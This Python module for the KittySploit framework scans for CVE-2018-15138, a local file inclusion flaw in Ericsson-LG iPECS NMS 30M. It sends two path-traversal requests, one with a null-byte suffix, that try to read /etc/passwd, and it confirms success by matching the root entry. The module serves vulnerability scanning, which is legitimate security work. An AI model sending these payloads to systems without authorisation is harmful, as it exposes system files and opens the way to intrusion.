#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ericsson-LG iPECS NMS 30M allows local file inclusion via ipecs-cm/download?filename=."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LG-Ericsson iPECS NMS 30M - Local File Inclusion Detection',
        'description': 'Ericsson-LG iPECS NMS 30M allows local file inclusion via ipecs-cm/download?filename=../ URIs.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'ericsson', 'lfi', 'traversal', 'edb', 'ericssonlg', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cxsecurity.com/issue/WLB-2018080070',
            'https://www.exploit-db.com/exploits/45167/',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-15138',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-15138',
    }

    def run(self):
        for path in ('/ipecs-cm/download?filename=../../../../../../../../../../etc/passwd&filepath=/home/wms/www/data', '/ipecs-cm/download?filename=jre-6u13-windows-i586-p.exe&filepath=../../../../../../../../../../etc/passwd%00.jpg'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:[x*]:0:0',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="LG-Ericsson iPECS NMS 30M - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

